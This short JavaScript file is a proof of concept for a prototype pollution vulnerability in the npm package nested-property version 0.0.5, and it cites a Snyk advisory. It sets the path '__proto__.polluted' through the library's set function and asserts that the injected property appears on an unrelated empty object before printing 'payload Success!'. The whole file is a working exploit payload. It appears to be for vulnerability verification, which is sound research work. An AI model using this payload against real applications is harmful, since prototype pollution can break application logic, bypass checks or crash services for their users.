//https://snyk.io/test/npm/nested-property/0.0.5

var nestedProperty = require("nested-property");
const assert = require('assert');

const object1 = {};
console.log("Before : " + object1.polluted);
nestedProperty.set(object1,'__proto__.polluted', "yes");


assert(object1.polluted == "yes")
console.log("After : " + object1.polluted);
console.log("payload Success!")